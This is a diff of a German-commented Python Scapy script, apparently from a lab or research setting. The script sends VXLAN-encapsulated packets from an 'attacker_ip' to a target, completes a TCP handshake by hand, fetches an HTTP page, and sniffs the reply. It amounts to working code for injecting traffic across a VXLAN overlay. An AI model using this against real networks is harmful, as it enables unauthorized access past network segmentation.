@@ -33,6 +33,8 @@ s_port = random.randint(20000,65500)
 
 CONNECTION = {"connected": False}
 CONNECTION_FINISHED = False
+http_content = ""
+threads = []
 
 
 # TCP-Flags definieren
@@ -56,13 +58,42 @@ VXLAN = IP(src=vtep_src,dst=vtep_dst)/UDP(sport=vxlanport,dport=vxlanport)/VXLAN
 ### getStr ist der String im HTTP Request
 getStr = 'GET / HTTP/1.1\r\nHost:' + dest + '\r\nAccept-Encoding: 8bit\r\n\r\n'
 
-#$$$$$ SEND TCP Package
+
+
+def sniff_all_packets():
+    sniff(session=TCPSession, filter = "tcp src port " + str(http_port), prn=packet_received, store=False, count = 5)
+    return
+
+def packet_received(packet):
+    payload_length = len(packet[TCP].payload)
+    flags = packet.getlayer(TCP).flags
+    in_seq = packet[TCP].seq
+    in_ack = packet[TCP].ack
+    dst_port = packet.getlayer(TCP).dport
+    ack_nr = in_seq + payload_length + 1
+    seq_nr = in_ack
+
+    ### starte den connection manager Thread
+    global threads
+    connection_management = threading.Thread(target=TCP_connection_manager, args=(packet, payload_length, flags, in_seq, in_ack, dst_port))
+    threads.append(connection_management)
+    connection_management.start()
+    
+    ### Greife HTTP header und Payload ab
+    if packet.haslayer(HTTPResponse) is True:
+        global http_status
+        ### http status ist die Response Status Nachricht. zB HTTP1.1/200/OK
+        http_status = str(packet.getlayer(HTTPResponse).Http_Version) + " " + str(packet.getlayer(HTTPResponse).Status_Code) + " " + str(packet.getlayer(HTTPResponse).Reason_Phrase) 
+    if packet.haslayer(Raw) is True:
+        global http_content
+        ### http content sind header und body und wird ggf aus mehreren Paketen zusammengesetzt. Nur die Layer Raw besitzt Teile von HTTP Content
+        http_content += str(packet.getlayer(Raw).load)
+
 def send_tcp(src_port, seqnr, acknr, tcp_flags):
     ack = VXLAN / IP(src=attacker_ip,dst=dest) / TCP(dport=http_port, sport=src_port,seq=seqnr, ack=acknr, flags=tcp_flags)
     out_ack = send(ack, verbose=0)
     return
 
-#$$$$$ SEND HTTP Request
 def syn_ack_received_send_http_req(src_port, seqnr, acknr):
     http_request = VXLAN / IP(src=attacker_ip,dst=dest) / TCP(dport=http_port, sport=src_port,seq=seqnr, ack=acknr, flags='P''A') / getStr
     send(http_request, verbose=0)
@@ -73,15 +104,11 @@ def syn_ack_received_send_http_req(src_port, seqnr, acknr):
         print("SEQ# = " + str(seqnr))
         print("")
 
-
 def send_request():
     while CONNECTION["connected"] is not True:
         time.sleep(0.01)
     syn_ack_received_send_http_req(CONNECTION["dst_port"], CONNECTION["seq_nr"], CONNECTION["ack_nr"])
 
-
-
-http_content = ""
 def fin_function():
     ### Wait until FIN packet is received
     while CONNECTION_FINISHED is not True:
@@ -100,10 +127,6 @@ def fin_function():
     url = "/home/ben/http_request/website.html"
     os.system('sudo -u ben google-chrome-stable /home/ben/http_request/website.html')
     return
-
-
-
-
 
 def TCP_connection_manager(packet, payload_length, flags, in_seq, in_ack, dst_port):
     if debug:
@@ -139,11 +162,11 @@ def TCP_connection_manager(packet, payload_length, flags, in_seq, in_ack, dst_po
             print ("ACK wird geschickt mit ACK#=" + str(ack_nr) + " und SEQ#=" + str(seq_nr))
         send_tcp(dst_port, seq_nr, ack_nr, send_flags)
 
-    ### SYN/ACK received
+    ### SYN/ACK received --> Connection = True
         if (flags & (SYN ^ ACK)) == 18:
            CONNECTION = { "connected": True , "dst_port": dst_port, "seq_nr": seq_nr, "ack_nr": ack_nr}
 
-    ### FIN received
+    ### FIN received --> Connection is finished
     if flags & FIN:
         send_flags = 'F''A'
         if debug:
@@ -154,48 +177,9 @@ def TCP_connection_manager(packet, payload_length, flags, in_seq, in_ack, dst_po
         print ("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\r\n\r\n\r\n")
     return
 
-### Thread Klasse initiieren fuer ACK
-class Sniff_Thread (threading.Thread):
-   def __init__(self):
-      threading.Thread.__init__(self)
-   def run(self):
-      sniff_all_packets()
-
-
-threads = []
-def packet_received(packet):
-    payload_length = len(packet[TCP].payload)
-    flags = packet.getlayer(TCP).flags
-    in_seq = packet[TCP].seq
-    in_ack = packet[TCP].ack
-    dst_port = packet.getlayer(TCP).dport
-    ack_nr = in_seq + payload_length + 1
-    seq_nr = in_ack
-
-    ### starte den connection manager Thread
-    global threads
-    connection_management = threading.Thread(target=TCP_connection_manager, args=(packet, payload_length, flags, in_seq, in_ack, dst_port))
-    threads.append(connection_management)
-    connection_management.start()
-    
-    ### Greife HTTP header und Payload ab
-    if packet.haslayer(HTTPResponse) is True:
-        global http_status
-        ### http status ist die Response Status Nachricht. zB HTTP1.1/200/OK
-        http_status = str(packet.getlayer(HTTPResponse).Http_Version) + " " + str(packet.getlayer(HTTPResponse).Status_Code) + " " + str(packet.getlayer(HTTPResponse).Reason_Phrase) 
-    if packet.haslayer(Raw) is True:
-        global http_content
-        ### http content sind header und body und wird ggf aus mehreren Paketen zusammengesetzt. Nur die Layer Raw besitzt Teile von HTTP Content
-        http_content += str(packet.getlayer(Raw).load)
 
 
 
-
-
-
-def sniff_all_packets():
-    sniff(session=TCPSession, filter = "tcp src port " + str(http_port), prn=packet_received, store=False, count = 5)
-    return
 
 
 
